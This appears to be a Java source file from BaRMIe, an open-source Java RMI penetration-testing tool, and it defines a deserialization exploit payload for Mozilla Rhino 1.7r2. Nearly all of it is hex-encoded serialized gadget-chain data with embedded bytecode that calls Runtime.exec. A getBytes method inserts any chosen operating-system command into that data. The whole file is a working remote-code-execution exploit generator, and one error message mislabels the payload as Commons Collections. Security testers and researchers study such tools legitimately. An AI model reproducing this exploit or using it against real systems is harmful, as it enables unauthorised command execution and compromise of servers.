package nb.barmie.modes.attack.deser.payloads;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import nb.barmie.exceptions.BaRMIeDeserPayloadGenerationException;
import nb.barmie.exceptions.BaRMIeException;
import nb.barmie.modes.attack.DeserPayload;

/***********************************************************
 * Deserialization payload for Mozilla Rhino 1.7r2.
 * 
 * Based on the ysoserial and the excellent work of Chris
 * Frohoff, Matthias Kaiser et al
 * (https://github.com/frohoff/ysoserial).
 * 
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class RhinoPayload1 extends DeserPayload {
	/*******************
	 * Properties
	 ******************/
	//Payload data chunks
	private final String _header_chunk = "7372002e6a617661782e6d616e6167656d656e742e42616441747472696275746556616c7565457870457863657074696f6ed4e7daab632d46400200014c000376616c7400124c6a6176612f6c616e672f4f626a6563743b70787200136a6176612e6c616e672e457863657074696f6ed0fd1f3e1a3b1cc402000070787200136a6176612e6c616e672e5468726f7761626c65d5c635273977b8cb0300044c000563617573657400154c6a6176612f6c616e672f5468726f7761626c653b4c000d64657461696c4d6573736167657400124c6a6176612f6c616e672f537472696e673b5b000a737461636b547261636574001e5b4c6a6176612f6c616e672f537461636b5472616365456c656d656e743b4c001473757070726573736564457863657074696f6e737400104c6a6176612f7574696c2f4c6973743b70787071007e0008707572001e5b4c6a6176612e6c616e672e537461636b5472616365456c656d656e743b02462a3c3cfd223902000070787000000000737200266a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c654c697374fc0f2531b5ec8e100200014c00046c69737471007e0007707872002c6a6176612e7574696c2e436f6c6c656374696f6e7324556e6d6f6469666961626c65436f6c6c656374696f6e19420080cb5ef71e0200014c0001637400164c6a6176612f7574696c2f436f6c6c656374696f6e3b707870737200136a6176612e7574696c2e41727261794c6973747881d21d99c7619d03000149000473697a65707870000000007704000000007871007e001078737200226f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654572726f72b5ea2521be49ce7d02000070787200296f72672e6d6f7a696c6c612e6a6176617363726970742e496453637269707461626c654f626a6563742a2b6fc82e6217a303000070787200276f72672e6d6f7a696c6c612e6a6176617363726970742e53637269707461626c654f626a65637465ce14728fc418e4030004490005636f756e744c00106173736f63696174656456616c75657374000f4c6a6176612f7574696c2f4d61703b4c0011706172656e7453636f70654f626a6563747400234c6f72672f6d6f7a696c6c612f6a6176617363726970742f53637269707461626c653b4c000f70726f746f747970654f626a65637471007e0015707870000000027070737200276f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654a6176614f626a6563749f91a59e35c431e10300024c0006706172656e7471007e00154c000970726f746f7479706571007e0015707870737200236f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654f626a656374a7f0f22aff97ba0c020000707871007e001200000037737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c647078703f4000000000000c7708000000100000000474000d4c4942524152595f53434f504571007e001a7400084974657261746f72737200336f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654974657261746f722453746f70497465726174696f6e227d07bedda89dbf020000707871007e0019000000007071007e001a7371007e0019000000007071007e001a707704000000007877040000000c78770400000000787704000000007874000a436c6173734361636865737200216f72672e6d6f7a696c6c612e6a6176617363726970742e436c617373436163686584f4c43496dc1f290200025a001063616368696e674973456e61626c656449001467656e657261746564436c61737353657269616c7078700000000000740000737200266f72672e6d6f7a696c6c612e6a6176617363726970742e4e617469766547656e657261746f7216d762746ec522c90200065a0009666972737454696d6549000a6c696e654e756d6265725a00066c6f636b65644c000866756e6374696f6e7400274c6f72672f6d6f7a696c6c612f6a6176617363726970742f4e617469766546756e6374696f6e3b4c000a6c696e65536f7572636571007e00054c000a7361766564537461746571007e0001707871007e001200000000707070770400000000787704000000057800000000000070707078707077040000005f7372002c6f72672e6d6f7a696c6c612e6a6176617363726970742e53637269707461626c654f626a65637424536c6f74ab79e83be385789d02000453000a6174747269627574657349000b696e6465784f72486173684c00046e616d6571007e00054c000576616c756571007e0001707870000000000000740000737200276f72672e6d6f7a696c6c612e6a6176617363726970742e496446756e6374696f6e4f626a656374b5ffd1c66ba0fed502000649000561726974794900086d6574686f6449645a001475736543616c6c4173436f6e7374727563746f724c000c66756e6374696f6e4e616d6571007e00054c0006696463616c6c7400274c6f72672f6d6f7a696c6c612f6a6176617363726970742f496446756e6374696f6e43616c6c3b4c000374616771007e000170787200236f72672e6d6f7a696c6c612e6a6176617363726970742e4261736546756e6374696f6e49b5dd1bb05c2ae302000249001b70726f746f7479706550726f7065727479417474726962757465734c001170726f746f7479706550726f706572747971007e0001707871007e00120000000070707371007e002e0000000070707077040000000078770400000000780000000070770400000000787704000000007800000000700000000000000000007070707371007e00290000000000007400007371007e002c00000000707070770400000000787704000000007800000000700000000000000000007070707371007e00290000000000007400007371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000047071007e001a71007e002177040000000b7371007e0029000000337a8b7400046e616d6571007e00357371007e0029000038eb00077400076d6573736167657400007371007e00290000d425c62774000866696c654e616d6571007e003c7371007e00290000ec61b05d74000a6c696e654e756d626572737200116a6176612e6c616e672e496e746567657212e2a0a4f781873802000149000576616c756570787200106a6176612e6c616e672e4e756d62657286ac951d0b94e08b02000070787000000000787704000000037800000001000000010171007e003571007e003771007e00357371007e002900021eb5489e7400096465636f64655552497371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000010071007e0045737200236f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665476c6f62616c546211ef26c230ca020000707870740006476c6f62616c7371007e002900022e10c5ff7400126465636f6465555249436f6d706f6e656e747371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000020071007e004b71007e004871007e00497371007e0029000259e44b76740009656e636f64655552497371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000030071007e004e71007e004871007e00497371007e00290002c89b7627740012656e636f6465555249436f6d706f6e656e747371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000040071007e005171007e004871007e00497371007e00290002b2dc80817400066573636170657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000050071007e005471007e004871007e00497371007e00290002002fb09c7400046576616c7371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000060071007e005771007e004871007e00497371007e00290002dc367e79740008697346696e6974657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000070071007e005a71007e004871007e00497371007e0029000205fd1b7174000569734e614e7371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000080071007e005d71007e004871007e00497371007e0029000231161eb87400096973584d4c4e616d657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001000000090071007e006071007e004871007e00497371007e00290002c428cf6974000a7061727365466c6f61747371007e002c000000007071007e001a7077040000000078770400000000780000000470000000010000000a0071007e006371007e004871007e00497371007e0029000246cc243c7400087061727365496e747371007e002c000000007071007e001a7077040000000078770400000000780000000470000000020000000b0071007e006671007e004871007e00497371007e00290002e7b3785a740008756e6573636170657371007e002c000000007071007e001a7077040000000078770400000000780000000470000000010000000c0071007e006971007e004871007e00497371007e00290002cde4cab5740006756e6576616c7371007e002c000000007071007e001a7077040000000078770400000000780000000470000000010000000d0071007e006c71007e004871007e00497371007e00290002000130db7400034e614e737200106a6176612e6c616e672e446f75626c6580b3c24a296bfb0402000144000576616c7565707871007e00427ff80000000000007371007e002900020e2cce48740008496e66696e6974797371007e00707ff00000000000007371007e00290002c21f6150740009756e646566696e6564737200206f72672e6d6f7a696c6c612e6a6176617363726970742e556e646566696e65647f9d9ecff72acbbf0200007078707371007e00290002e859127274000f436f6e76657273696f6e4572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e007a7877040000000078000000010000000e0171007e007a71007e004871007e00497371007e002900029fc652ac7400094576616c4572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e007f7877040000000078000000010000000e0171007e007f71007e004871007e00497371007e002900020932c2eb74000a52616e67654572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e00847877040000000078000000010000000e0171007e008471007e004871007e00497371007e002900025198459d74000e5265666572656e63654572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e00897877040000000078000000010000000e0171007e008971007e004871007e00497371007e00290002605053c574000b53796e7461784572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e008e7877040000000078000000010000000e0171007e008e71007e004871007e00497371007e0029000294f7e6ce740009547970654572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e00937877040000000078000000010000000e0171007e009371007e004871007e00497371007e00290002f016881c7400085552494572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e00987877040000000078000000010000000e0171007e009871007e004871007e00497371007e002900029b10f92b74000d496e7465726e616c4572726f727371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e009d7877040000000078000000010000000e0171007e009d71007e004871007e00497371007e00290002dd2fbc2d74000d4a617661457863657074696f6e7371007e002c000000007071007e001a707704000000007877040000000078000000077371007e0011000000017071007e001a71007e00377704000000057371007e0029000000337a8b71007e003971007e00a27877040000000078000000010000000e0171007e00a271007e004871007e00497371007e0029000203c9823974000541727261797371007e002c000000117071007e001a707704000000177371007e002900020031dd2a7400046a6f696e7371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffffb0071007e00aa737200226f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665417272617965be3f5055db7c6a0200035a000964656e73654f6e6c794a00066c656e6774685b000564656e73657400135b4c6a6176612f6c616e672f4f626a6563743b707871007e0012000000007071007e001a71007e00217704000000007877040000001578010000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c0200007078700000000a737200206f72672e6d6f7a696c6c612e6a6176617363726970742e556e69717565546167c40a4c7517c9e69502000149000574616749647078700000000171007e00b271007e00b271007e00b271007e00b271007e00b271007e00b271007e00b271007e00b271007e00b271007e00a77371007e00290002418e52e2740007726576657273657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001fffffffa0071007e00b471007e00ae71007e00a77371007e002900020035f59e740004736f72747371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff90071007e00b771007e00ae71007e00a77371007e002900020034af1a740004707573687371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff80071007e00ba71007e00ae71007e00a77371007e002900020001b251740003706f707371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff70071007e00bd71007e00ae71007e00a77371007e0029000206856c8274000573686966747371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff60071007e00c071007e00ae71007e00a77371007e00290002ef739589740007756e73686966747371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff50071007e00c371007e00ae71007e00a77371007e00290002ca9a467c74000673706c6963657371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff40071007e00c671007e00ae71007e00a77371007e00290002af3f7714740006636f6e6361747371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff30071007e00c971007e00ae71007e00a77371007e0029000206873d92740005736c6963657371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff20071007e00cc71007e00ae71007e00a77371007e0029000273d44649740007696e6465784f667371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff10071007e00cf71007e00ae71007e00a77371007e00290002e42256d374000b6c617374496e6465784f667371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff00071007e00d271007e00ae71007e00a77371007e0029000205c6731b74000565766572797371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffef0071007e00d571007e00ae71007e00a77371007e00290002b408cb7874000666696c7465727371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffee0071007e00d871007e00ae71007e00a77371007e00290002d78cd66a740007666f72456163687371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffed0071007e00db71007e00ae71007e00a77371007e002900020001a55c7400036d61707371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffec0071007e00de71007e00ae71007e00a77371007e002900020035f4f4740004736f6d657371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffeb0071007e00e171007e00ae71007e00a778770400000000780000000771007e00ae00000001000000010171007e00a771007e00ae71007e00a77371007e00290002943a4c31740006537472696e677371007e002c000000127071007e001a7077040000002f7371007e00290002c4fe4c2d74000c66726f6d43686172436f64657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001ffffffff0071007e00e7737200236f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665537472696e670cc57334977d230f0200014c0006737472696e6771007e0005707871007e0012000000007071007e001a71007e0021770400000000787704000000247871007e003c71007e00e47371007e00290002aed71e297400066368617241747371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffffb0071007e00ec71007e00ea71007e00e47371007e0029000217ac15f674000a63686172436f646541747371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffffa0071007e00ef71007e00ea71007e00e47371007e0029000273d4464971007e00cf7371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff90071007e00cf71007e00ea71007e00e47371007e00290002e42256d371007e00d27371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff80071007e00d271007e00ea71007e00e47371007e0029000206891b1a74000573706c69747371007e002c000000007071007e001a707704000000007877040000000078000000047000000003fffffff70071007e00f671007e00ea71007e00e47371007e002900021f9f6e51740009737562737472696e677371007e002c000000007071007e001a707704000000007877040000000078000000047000000003fffffff60071007e00f971007e00ea71007e00e47371007e00290002bc31dd9674000b746f4c6f776572436173657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001fffffff50071007e00fc71007e00ea71007e00e47371007e00290002e82f52b774000b746f5570706572436173657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001fffffff40071007e00ff71007e00ea71007e00e47371007e00290002cadc57f17400067375627374727371007e002c000000007071007e001a707704000000007877040000000078000000047000000003fffffff30071007e010271007e00ea71007e00e47371007e00290002af3f771471007e00c97371007e002c000000007071007e001a707704000000007877040000000078000000047000000002fffffff20071007e00c971007e00ea71007e00e47371007e0029000206873d9271007e00cc7371007e002c000000007071007e001a707704000000007877040000000078000000047000000003fffffff10071007e00cc71007e00ea71007e00e47371007e002900020f5dad41740010657175616c7349676e6f7265436173657371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffe20071007e010971007e00ea71007e00e47371007e00290002062dd9c57400056d617463687371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffe10071007e010c71007e00ea71007e00e47371007e00290002c9fa65a87400067365617263687371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffe00071007e010f71007e00ea71007e00e47371007e00290002413cb2b47400077265706c6163657371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffdf0071007e011271007e00ea71007e00e47371007e002900023e27cd2b74000d6c6f63616c65436f6d706172657371007e002c000000007071007e001a707704000000007877040000000078000000047000000002ffffffde0071007e011571007e00ea71007e00e47371007e00290002a8aecc9c740011746f4c6f63616c654c6f776572436173657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001ffffffdd0071007e011871007e00ea71007e00e478770400000000780000000771007e00ea00000001000000010171007e00e471007e00ea71007e00e47371007e0029000267140408740007426f6f6c65616e7371007e002c000000007071007e001a70770400000000787704000000007800000007737200246f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665426f6f6c65616ecc6a9303539de71b0200015a000c626f6f6c65616e56616c7565707871007e0012000000007071007e001a71007e002177040000000078770400000004780000000001000000010171007e011b71007e011e71007e011b7371007e002900028bbdc7697400064e756d6265727371007e002c000000057071007e001a7077040000000b7371007e00290007000130db71007e006f71007e00717371007e00290007eb1e29ae740011504f5349544956455f494e46494e4954597371007e00707ff00000000000007371007e0029000734e07af27400114e454741544956455f494e46494e4954597371007e0070fff00000000000007371007e00290007cedd22967400094d41585f56414c55457371007e00707fefffffffffffff7371007e00290007fce839047400094d494e5f56414c55457371007e00700000000000000001787704000000007800000007737200236f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654e756d62657230a28b6f31d79da502000144000b646f75626c6556616c7565707871007e0012000000007071007e001a71007e00217704000000007877040000000878000000000000000000000001000000010171007e012071007e013071007e01207371007e00290002002063ce740004446174657371007e002c000000037071007e001a707704000000057371007e002900020001aad67400036e6f777371007e002c000000007071007e001a707704000000007877040000000078000000047000000000fffffffd0071007e0135737200216f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665446174658cb60c521acef48a02000144000464617465707871007e0012000000007071007e001a71007e00217704000000007877040000002d787ff800000000000071007e01327371007e0029000206581ab374000570617273657371007e002c000000007071007e001a707704000000007877040000000078000000047000000001fffffffe0071007e013a71007e013871007e01327371007e00290002000149847400035554437371007e002c000000007071007e001a707704000000007877040000000078000000047000000001ffffffff0071007e013d71007e013871007e013278770400000000780000000771007e013800000001000000010171007e013271007e013871007e01327371007e0029000200247b287400044d617468737200216f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654d61746885561b50925cc9cf020000707871007e0012000000007071007e001a71007e00217704000000007877040000001b787371007e00290002002924e6740004576974687371007e002c000000007071007e001a70770400000000787704000000007800000007737200216f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976655769746800000000000000010200024c0006706172656e7471007e00154c000970726f746f7479706571007e001570787071007e001a71007e002100000000000000010171007e014471007e014771007e01447371007e00290002001fee7e74000443616c6c7371007e002c000000007071007e001a70770400000000787704000000007800000007737200216f72672e6d6f7a696c6c612e6a6176617363726970742e4e617469766543616c6c98500d2b813fd2ca0200024c000866756e6374696f6e71007e00275b000c6f726967696e616c4172677371007e00ad707871007e0012000000007071007e001a71007e00217704000000007877040000000178707000000001000000010171007e014971007e014c71007e01497371007e00290002934abceb7400065363726970747371007e002c000000007071007e001a737200236f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665536372697074a1b2f37ec354ad9c0200014c000673637269707474001f4c6f72672f6d6f7a696c6c612f6a6176617363726970742f5363726970743b707871007e002e000000007071007e001a71007e0021770400000000787704000000047800000004707077040000000078770400000000780000000771007e015200000001000000010171007e014e71007e015271007e014e7371007e002900024a566c8e71007e001e7371007e002c000000007071007e001a70770400000000787704000000007800000007737200256f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654974657261746f72c6968956626dc69f0200014c000e6f626a6563744974657261746f7271007e0001707871007e0012000000007071007e001a71007e002177040000000078770400000003787000000002000000010171007e001e71007e015671007e001e7371007e0029000240bc18db74000d53746f70497465726174696f6e71007e0020737200326f72672e6d6f7a696c6c612e6a6176617363726970742e53637269707461626c654f626a65637424476574746572536c6f74bbfda92373201d6c0200024c000667657474657271007e00014c000673657474657271007e0001707871007e0029000291ac8d09740006526567457870737200276f72672e6d6f7a696c6c612e6a6176617363726970742e4c617a696c794c6f6164656443746f7200000000000000010200065a00067365616c656449000573746174654c0009636c6173734e616d6571007e00054c0010696e697469616c697a656456616c756571007e00014c000c70726f70657274794e616d6571007e00054c000573636f70657400294c6f72672f6d6f7a696c6c612f6a6176617363726970742f53637269707461626c654f626a6563743b707870000000000074002a6f72672e6d6f7a696c6c612e6a6176617363726970742e7265676578702e4e61746976655265674578707071007e015b71007e001a70707371007e01590002309bb90d7400085061636b616765737371007e015c000000000074002b6f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654a617661546f705061636b6167657071007e016171007e001a70707371007e015900020031aa227400046a6176617371007e015c000000000071007e01637071007e016571007e001a70707371007e0159000206039a967400056a617661787371007e015c000000000071007e01637071007e016871007e001a70707371007e015900020001aee47400036f72677371007e015c000000000071007e01637071007e016b71007e001a70707371007e0159000200018181740003636f6d7371007e015c000000000071007e01637071007e016e71007e001a70707371007e01590002000187b67400036564757371007e015c000000000071007e01637071007e017171007e001a70707371007e015900020001a99d7400036e65747371007e015c000000000071007e01637071007e017471007e001a70707371007e0159000274434fc2740008676574436c6173737371007e015c000000000071007e01637071007e017771007e001a70707371007e015900026c71eead74000b4a617661416461707465727371007e015c00000000007400226f72672e6d6f7a696c6c612e6a6176617363726970742e4a617661416461707465727071007e017a71007e001a70707371007e0159000256774b7474000c4a617661496d706f727465727371007e015c00000000007400276f72672e6d6f7a696c6c612e6a6176617363726970742e496d706f72746572546f704c6576656c7071007e017e71007e001a70707371007e01590002dcb5ca5774000c436f6e74696e756174696f6e7371007e015c00000000007400296f72672e6d6f7a696c6c612e6a6176617363726970742e4e6174697665436f6e74696e756174696f6e7071007e018271007e001a70707371007e01590002000153f7740003584d4c7371007e015c00000000007400296f72672e6d6f7a696c6c612e6a6176617363726970742e786d6c696d706c2e584d4c4c6962496d706c7071007e018671007e001a70707371007e01590002b6dca535740007584d4c4c6973747371007e015c000000000071007e01887071007e018a71007e001a70707371007e01590002c215753b7400094e616d6573706163657371007e015c000000000071007e01887071007e018d71007e001a70707371007e01590002049a5e7c740005514e616d657371007e015c000000000071007e01887071007e019071007e001a70707877040000000078707701007372003a636f6d2e73756e2e6f72672e6170616368652e78616c616e2e696e7465726e616c2e78736c74632e747261782e54656d706c61746573496d706c09574fc16eacab3303000649000d5f696e64656e744e756d62657249000e5f7472616e736c6574496e6465785b000a5f62797465636f6465737400035b5b425b00065f636c6173737400125b4c6a6176612f6c616e672f436c6173733b4c00055f6e616d6571007e00054c00115f6f757470757450726f706572746965737400164c6a6176612f7574696c2f50726f706572746965733b70787000000000ffffffff757200035b5b424bfd19156767db3702000070787000000002757200025b42acf317f8060854e0020000707870";
	private final String _mid_chunk = "cafebabe0000003100380a00030022070036070025070026010001410100014a010001410500000000000000000100063c696e69743e010003282956010004436f646501000141010001410100014101000141010001410100014101000141010005284c3b29560100014101000141010001410100014101000141070027010006284c413b29560100014101000141010001410100014101000141010001410c000a000b07002801000141010040636f6d2f73756e2f6f72672f6170616368652f78616c616e2f696e7465726e616c2f78736c74632f72756e74696d652f41627374726163745472616e736c65740100146a6176612f696f2f53657269616c697a61626c6501000141010001410100083c636c696e69743e0100116a6176612f6c616e672f52756e74696d6507002a01000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b0c002c002d0a002b002e01";
	private final String _footer_chunk = "08003001000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0c003200330a002b00340100014101000141002100020003000100040001001a000500060001000700000002000800040001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000002e000e0000000c000100000005000f003700000001001300140002000c0000003f0000000300000001b100000002000d00000006000100000033000e00000020000300000001000f0037000000000001001500160001000000010017001800020019000000040001001a00010013001b0002000c000000490000000400000001b100000002000d00000006000100000037000e0000002a000400000001000f003700000000000100150016000100000001001c001d000200000001001e001f00030019000000040001001a00080029000b0001000c0000001b000300020000000fa70003014cb8002f1231b6003557b1000000000002002000000002002100110000000a000100020023001000097571007e019900000113cafebabe00000031001b0a00030015070017070018070019010001410100014a010001410500000000000000000100063c696e69743e010003282956010004436f646501000141010001410100014101000141010001410100014101000141010001410c000a000b07001a01000241410100106a6176612f6c616e672f4f626a6563740100146a6176612f696f2f53657269616c697a61626c6501000141002100020003000100040001001a000500060001000700000002000800010001000a000b0001000c0000002f00010001000000052ab70001b100000002000d0000000600010000003b000e0000000c000100000005000f001200000002001300000002001400110000000a000100020016001000097074000141707701007874000f6a6176612e6c616e672e436c617373787704000000017371007e0159000000337a8b71007e003971007e0078737200206f72672e6d6f7a696c6c612e6a6176617363726970742e4d656d626572426f78583e1be606e304b503000070787077020101740005656e7465727672001e6f72672e6d6f7a696c6c612e6a6176617363726970742e436f6e7465787400000000000000000000007078707702000078707371007e0159000038eb000771007e003b71007e0078737200276f72672e6d6f7a696c6c612e6a6176617363726970742e4e61746976654a6176614d6574686f64d0414efe72fe69000200024c000c66756e6374696f6e4e616d6571007e00055b00076d6574686f64737400235b4c6f72672f6d6f7a696c6c612f6a6176617363726970742f4d656d626572426f783b707871007e002e000000007070707704000000007877040000000078000000047071007e003b757200235b4c6f72672e6d6f7a696c6c612e6a6176617363726970742e4d656d626572426f783b3226214ee6215239020000707870000000017371007e019f7702010174000e6e65775472616e73666f726d65727671007e01927702000078707877040000000078";
	
	/*******************
	 * Set payload properties
	 ******************/
	public RhinoPayload1() {
		super();
		this.setName("Rhino1");
		this.setDescription("Mozilla Rhino 1.7r2");
		this.setRemediationAdvice("[Mozilla Rhino] " + this.REMEDIATION_NO_FIX);
		this.setAffectedJars(new String[] {
			"js.jar"
		});
	}
	
	/*******************
	 * Generate payload bytes for the given OS command, correcting references
	 * by the given amount.
	 * 
	 * @param cmd The operating system command to execute.
	 * @param refCorrection The amount to correct TC_REFERENCE handles by (see note above).
	 * @return An array of bytes making up the deserialization payload.
	 ******************/
	public byte[] getBytes(String cmd, int refCorrection) throws BaRMIeException {
		ByteArrayOutputStream out;
		
		//Generate the payload bytes
		try {
			//Fix references in the header bytes and add them to the output
			out = new ByteArrayOutputStream();
			out.write(this.fixReferences(this.hexStrToByteArray(this._header_chunk), refCorrection));
			
			//Add the middle chunk
			out.write(this.intToByteArray(765 + cmd.length()));
			out.write(this.hexStrToByteArray(this._mid_chunk));
			
			//Add the command string to the output
			out.write(this.stringToUtf8ByteArray(cmd));
			
			//Fix references in the footer bytes and add them to the output
			out.write(this.fixReferences(this.hexStrToByteArray(this._footer_chunk), refCorrection));
		} catch(IOException ioe) {
			throw new BaRMIeDeserPayloadGenerationException("Failed to build Commons Collections 1 deserialization payload.", ioe);
		}
		
		//Return the payload bytes
		return out.toByteArray();
	}
}

